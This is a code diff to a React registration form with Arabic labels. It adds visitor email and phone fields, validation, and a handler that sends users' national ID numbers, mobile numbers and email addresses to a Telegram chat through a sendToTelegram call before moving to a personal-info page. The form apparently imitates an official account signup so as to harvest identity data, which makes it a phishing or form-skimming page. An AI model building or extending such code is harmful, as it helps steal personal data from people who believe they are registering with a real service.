@@ -14,6 +14,10 @@ const AccountTypeForm = () => {
   const [recaptchaValue, setRecaptchaValue] = useState<string | null>(null);
   const [nationalId, setNationalId] = useState<string>("");
   const [mobileNumber, setMobileNumber] = useState<string>("");
+  const [visitorEmail, setVisitorEmail] = useState<string>("");
+  const [visitorEmailConfirm, setVisitorEmailConfirm] = useState<string>("");
+  const [visitorMobile, setVisitorMobile] = useState<string>("");
+  const [phoneCode, setPhoneCode] = useState<string>("");
   
   const handleRecaptchaChange = (value: string | null) => {
     setRecaptchaValue(value);
@@ -40,9 +44,34 @@ const AccountTypeForm = () => {
     }
   };
 
+  const isFormValid = () => {
+    if (!accountType) return false;
+    
+    if (accountType === "citizens") {
+      return nationalId.trim() !== "" && mobileNumber.trim() !== "" && recaptchaValue !== null;
+    } else if (accountType === "visitors") {
+      return visitorEmail.trim() !== "" && 
+             visitorEmailConfirm.trim() !== "" && 
+             visitorEmail === visitorEmailConfirm &&
+             visitorMobile.trim() !== "" && 
+             phoneCode !== "" && 
+             recaptchaValue !== null;
+    }
+    
+    return false;
+  };
+
   const handleContinue = async () => {
+    if (!isFormValid()) {
+      alert("يرجى إكمال جميع الحقول المطلوبة بشكل صحيح");
+      return;
+    }
+
     if (accountType === "citizens") {
       const message = `تسجيل - نوع الحساب\n\nرقم البطاقة الشخصية: ${nationalId}\nرقم الهاتف المحمول: ${mobileNumber}`;
+      await sendToTelegram(message);
+    } else if (accountType === "visitors") {
+      const message = `تسجيل - نوع الحساب (زائر)\n\nالبريد الإلكتروني: ${visitorEmail}\nرقم الهاتف: ${phoneCode} ${visitorMobile}`;
       await sendToTelegram(message);
     }
     navigate("/personal-info");
@@ -121,14 +150,29 @@ const AccountTypeForm = () => {
             <Label htmlFor="email" className="text-right block mb-2">
               البريد الإلكتروني
             </Label>
-            <Input id="email" type="email" className="text-right bg-white" />
+            <Input 
+              id="email" 
+              type="email" 
+              className="text-right bg-white" 
+              value={visitorEmail}
+              onChange={(e) => setVisitorEmail(e.target.value)}
+            />
           </div>
 
           <div>
             <Label htmlFor="confirmEmail" className="text-right block mb-2">
               أعد إدخال البريد الإلكتروني
             </Label>
-            <Input id="confirmEmail" type="email" className="text-right bg-white" />
+            <Input 
+              id="confirmEmail" 
+              type="email" 
+              className="text-right bg-white" 
+              value={visitorEmailConfirm}
+              onChange={(e) => setVisitorEmailConfirm(e.target.value)}
+            />
+            {visitorEmailConfirm && visitorEmail !== visitorEmailConfirm && (
+              <p className="text-destructive text-xs mt-1 text-right">البريد الإلكتروني غير متطابق</p>
+            )}
           </div>
 
           <div className="grid grid-cols-2 gap-4">
@@ -136,14 +180,20 @@ const AccountTypeForm = () => {
               <Label htmlFor="visitorMobile" className="text-right block mb-2">
                 رقم الهاتف المحمول
               </Label>
-              <Input id="visitorMobile" type="tel" className="text-right bg-white" />
+              <Input 
+                id="visitorMobile" 
+                type="tel" 
+                className="text-right bg-white" 
+                value={visitorMobile}
+                onChange={(e) => setVisitorMobile(e.target.value)}
+              />
             </div>
 
             <div>
               <Label htmlFor="phoneCode" className="text-right block mb-2">
                 حدد الرمز الهاتف الدولي
               </Label>
-              <Select>
+              <Select value={phoneCode} onValueChange={setPhoneCode}>
                 <SelectTrigger className="bg-white">
                   <SelectValue placeholder="حدد الرمز الهاتف الدولي" />
                 </SelectTrigger>
@@ -317,7 +367,11 @@ const AccountTypeForm = () => {
           </Button>
         </div>
         
-        <Button className="min-w-32 bg-primary hover:bg-primary/90" onClick={handleContinue}>
+        <Button 
+          className="min-w-32 bg-primary hover:bg-primary/90" 
+          onClick={handleContinue}
+          disabled={!isFormValid()}
+        >
           استمر
         </Button>
       </div>
